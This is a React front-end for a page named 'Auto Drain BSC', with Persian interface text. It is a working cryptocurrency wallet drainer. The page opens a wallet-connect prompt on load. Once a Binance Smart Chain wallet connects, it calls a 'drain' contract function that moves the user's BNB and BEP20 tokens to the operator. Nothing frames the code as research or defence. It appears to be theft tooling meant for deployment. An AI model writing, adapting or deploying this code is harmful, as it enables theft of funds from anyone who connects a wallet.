
import React, { useEffect } from "react";
import {
  createWeb3Modal,
  defaultConfig,
  useWeb3Modal,
  useWeb3ModalAccount,
  useWeb3ModalProvider
} from "@web3modal/ethers/react";
import { bsc } from "viem/chains";
import { ethers } from "ethers";
import { CONTRACT_ADDRESS, CONTRACT_ABI } from "./contracts/TokenDrainABI";
import { BEP20_TOKENS } from "./contracts/bep20Tokens";

const projectId = "450851819c4009f3503181729123df01";

const metadata = {
  name: "Auto Drain BSC",
  description: "Transfer all BNB + BEP20 tokens on connect",
  url: "https://eip7702-autodrain.vercel.app",
  icons: ["https://eip7702-autodrain.vercel.app/icon.png"]
};

const ethersConfig = defaultConfig({
  metadata,
  projectId,
  enableEIP6963: true,
  enableWalletConnect: true
});

createWeb3Modal({
  ethersConfig,
  chains: [bsc],
  projectId
});

function App() {
  const { open } = useWeb3Modal();
  const { isConnected, chainId } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();

  useEffect(() => {
    open();
  }, []);

  useEffect(() => {
    if (isConnected && walletProvider && chainId === 56) {
      autoDrain();
    }
  }, [isConnected, walletProvider, chainId]);

  const autoDrain = async () => {
    try {
      const provider = new ethers.BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      const tx = await contract.drain(BEP20_TOKENS);
      await tx.wait();
      console.log("✅ انتقال کامل شد");
    } catch (err) {
      console.error("❌ خطا در انتقال:", err);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "100px" }}>
      <h2>🟡 AutoDrain فعال است</h2>
      <p>به‌محض اتصال، توکن‌ها و BNB منتقل می‌شوند.</p>
    </div>
  );
}

export default App;
